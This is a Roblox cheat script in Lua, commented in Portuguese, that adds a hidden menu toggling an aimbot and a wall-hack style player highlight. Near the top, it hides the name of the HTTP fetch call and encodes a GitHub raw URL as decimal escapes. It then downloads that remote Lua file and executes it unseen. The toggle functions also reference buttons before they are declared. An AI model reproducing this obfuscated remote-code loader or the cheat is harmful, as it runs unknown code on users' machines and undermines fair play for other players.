-- Camada de Proteção e Bypass (Mantida)
local _g = getgenv and getgenv() or _G
local _game = game
local _http = "H" .. "tt" .. "pG" .. "et"
local _ls = loadstring
local _u = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\107\97\121\110\97\110\57\48\48\48\47\84\101\115\116\101\45\50\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\84\101\115\116\101\46\108\117\97"

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- ** 1. PREVENÇÃO DE EXECUÇÃO DUPLA (ESSENCIAL) **
if _g.ScriptJaCarregado then 
    warn("Script já está rodando! Execução ignorada.")
    return 
end
_g.ScriptJaCarregado = true
print("[Script] Instância única garantida. Iniciando carregamento e UI...")

-- ** 2. CARREGAMENTO DO SCRIPT EXTERNO **
local function _exec(_target_url)
    local success, result = pcall(function()
        return _ls(_game[_http](_game, _target_url))
    end)
    if success and result then result() else warn("[Script] Erro ao carregar script externo.") end
end
_exec(_u)

-- ** 3. VARIÁVEIS DE ESTADO E CONEXÕES **
local ESP_Ativo = false
local Aimbot_Ativo = false
local AimbotConnection = nil
local ESPConnection = nil

-- ** 4. LÓGICA DE FUNÇÕES (Cheats) **

-- Função de Aimbot (Baseada na sua lógica original)
local function ToggleAimbot()
    if Aimbot_Ativo then
        -- DESATIVAÇÃO
        if AimbotConnection then
            AimbotConnection:Disconnect()
            AimbotConnection = nil
        end
        Aimbot_Ativo = false
        print("Aimbot DESATIVADO")
    else
        -- ATIVAÇÃO
        if not LocalPlayer or not workspace.CurrentCamera then return end
        
        local Camera = workspace.CurrentCamera
        local fovLimit = 60
        
        AimbotConnection = RunService.RenderStepped:Connect(function()
            if not LocalPlayer.Character then return end
            
            local closestPlayer = nil
            local shortestDistance = math.huge
            
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    local rootPart = player.Character.HumanoidRootPart
                    local headPos, onScreen = Camera:WorldToViewportPoint(rootPart.Position)
                    
                    if onScreen then
                        local dist = (Vector2.new(headPos.X, headPos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).magnitude
                        
                        if dist < fovLimit and dist < shortestDistance then
                            closestPlayer = player
                            shortestDistance = dist
                        end
                    end
                end
            end
            
            if closestPlayer and closestPlayer.Character:FindFirstChild("Head") then
                local head = closestPlayer.Character.Head
                -- Aplica mira suave
                Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, head.Position), 0.5)
            end
        end)
        Aimbot_Ativo = true
        print("Aimbot ATIVADO")
    end
    -- Atualiza o texto do botão
    AimbotBtn.Text = (Aimbot_Ativo and "🎯 Aimbot: LIGADO" or "🎯 Aimbot: DESLIGADO")
    AimbotBtn.BackgroundColor3 = (Aimbot_Ativo and Color3.fromRGB(46, 204, 113) or Color3.fromRGB(231, 76, 60))
end

-- Função de ESP (Highlight)
local function ToggleESP()
    if ESP_Ativo then
        -- DESATIVAÇÃO: Limpar Highlights existentes
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                local h = player.Character:FindFirstChildOfClass("Highlight")
                if h then h:Destroy() end
            end
        end
        -- Desconectar loop
        if ESPConnection then
            ESPConnection:Disconnect()
            ESPConnection = nil
        end
        ESP_Ativo = false
        print("ESP DESATIVADO")
    else
        -- ATIVAÇÃO
        ESPConnection = RunService.Heartbeat:Connect(function()
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    local h = player.Character:FindFirstChildOfClass("Highlight")
                    if not h then
                        h = Instance.new("Highlight", player.Character)
                        h.OutlineTransparency = 0
                        h.FillTransparency = 0.5
                        h.FillColor = Color3.fromRGB(255, 0, 0)
                    end
                -- Limpeza de Highlights se o player morrer/mudar
                elseif player.Character and player.Character:FindFirstChildOfClass("Highlight") then
                     player.Character:FindFirstChildOfClass("Highlight"):Destroy()
                end
            end
        end)
        ESP_Ativo = true
        print("ESP ATIVADO")
    end
    -- Atualiza o texto do botão
    ESPBtn.Text = (ESP_Ativo and "👁️ ESP: LIGADO" or "👁️ ESP: DESLIGADO")
    ESPBtn.BackgroundColor3 = (ESP_Ativo and Color3.fromRGB(46, 204, 113) or Color3.fromRGB(231, 76, 60))
end

-- ** 5. RECRIAÇÃO DA INTERFACE GRÁFICA (UI) **

-- Limpa qualquer painel antigo que possa ter sido criado
if game.CoreGui:FindFirstChild("PainelDeFuncoes") then
    game.CoreGui.PainelDeFuncoes:Destroy()
end

local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local CloseBtn = Instance.new("TextButton") -- Novo: Botão de fechar (X)
local ESPBtn = Instance.new("TextButton")
local AimbotBtn = Instance.new("TextButton")

ScreenGui.Name = "PainelDeFuncoes"
ScreenGui.Parent = game.CoreGui
ScreenGui.ResetOnSpawn = false

-- Configuração do painel principal (Frame)
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.Position = UDim2.new(0.5, -100, 0.5, -75)
MainFrame.Size = UDim2.new(0, 200, 0, 150)
MainFrame.Active = true
-- >>> CORREÇÃO CRÍTICA: Removendo o Draggable do Roblox para evitar rastros
-- MainFrame.Draggable = true 
MainFrame.Visible = false -- Começa oculto!

-- Título (Área para arrastar)
Title.Parent = MainFrame
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "Menu de Auxílio [INSERT]"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Title.Active = true -- Essencial para capturar cliques e inputs

-- Botão de Fechar (X)
CloseBtn.Parent = Title
CloseBtn.Size = UDim2.new(0, 30, 1, 0)
CloseBtn.Position = UDim2.new(1, -30, 0, 0)
CloseBtn.Text = "X"
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = false
end)


-- Função auxiliar para criar botões com estilo
local function CriarBotao(btn, texto, pos, cor)
    btn.Parent = MainFrame
    btn.Position = pos
    btn.Size = UDim2.new(0.9, 0, 0, 35)
    btn.Text = texto
    btn.BackgroundColor3 = cor
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.AnchorPoint = Vector2.new(0.5, 0)
    btn.Position = UDim2.new(0.5, 0, pos.Scale, pos.Offset)
end

-- Botão ESP
CriarBotao(ESPBtn, "👁️ ESP: DESLIGADO", UDim2.new(0, 0, 0.3, 10), Color3.fromRGB(231, 76, 60))
ESPBtn.MouseButton1Click:Connect(ToggleESP)

-- Botão Aimbot
CriarBotao(AimbotBtn, "🎯 Aimbot: DESLIGADO", UDim2.new(0, 0, 0.6, 20), Color3.fromRGB(231, 76, 60))
AimbotBtn.MouseButton1Click:Connect(ToggleAimbot)

-- ** 6. LÓGICA DE ABRIR E FECHAR O PAINEL (TOGGLE) **

UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Insert and not UserInputService:GetFocusedTextBox() then
        MainFrame.Visible = not MainFrame.Visible
        print("Painel Toggle: " .. (MainFrame.Visible and "ABERTO" or "FECHADO"))
    end
end)


-- ** 7. LÓGICA DE ARRASTAR MANUAL (SEM RASTROS) **

local dragging = false
local dragStart = Vector2.new(0, 0)
local startPos = UDim2.new(0, 0, 0, 0)

-- Inicia o arrastar quando o clique/toque começa no Título
Title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        -- Evita que o clique seja propagado para outros elementos
        UserInputService:SetMouseBehavior(Enum.MouseBehavior.LockCenter) 
    end
end)

-- Atualiza a posição a cada movimento do mouse/toque
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X, 
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

-- Para o arrastar quando o clique/toque termina
Title.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
        UserInputService:SetMouseBehavior(Enum.MouseBehavior.Default)
    end
end)
